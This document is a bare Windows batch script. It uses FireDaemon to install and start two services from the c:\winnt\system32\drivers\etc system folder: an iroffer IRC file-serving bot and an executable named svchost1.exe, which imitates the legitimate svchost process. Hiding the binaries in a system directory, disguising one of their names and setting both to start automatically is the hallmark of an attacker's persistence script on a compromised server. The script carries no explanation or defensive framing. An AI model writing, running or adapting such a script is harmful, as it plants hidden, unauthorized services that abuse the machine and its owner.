@ECHO OFF
set mxbin=c:\winnt\system32\drivers\etc
set mxhome=c:\winnt\system32\drivers\etc
cd c:\winnt\system32\drivers\etc
Firedaemon -i iroffer "c:\winnt\system32\drivers\etc" "c:\winnt\system32\drivers\etc\iroffer.exe" "c:\winnt\system32\drivers\etc\wg.dll" Y 0 0 N Y
Firedaemon -i svchost1 "c:\winnt\system32\drivers\etc" "c:\winnt\system32\drivers\etc\svchost1.exe" "" Y 0 0 N Y

net start iroffer 
net start svchost1


